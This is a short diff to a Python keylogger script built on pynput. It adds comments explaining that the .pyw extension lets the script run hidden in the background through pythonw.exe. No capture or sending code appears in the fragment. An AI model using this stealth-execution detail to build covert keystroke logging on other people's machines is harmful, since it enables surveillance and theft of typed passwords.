@@ -1,4 +1,6 @@
-# keylogger.pyw
+# keylogger.pyw # runs in a background using pythonw.exe
+# keylogger.pw # open a terminal window using python.exe
+
 from pynput.keyboard import Key, Listener
 import logging
 
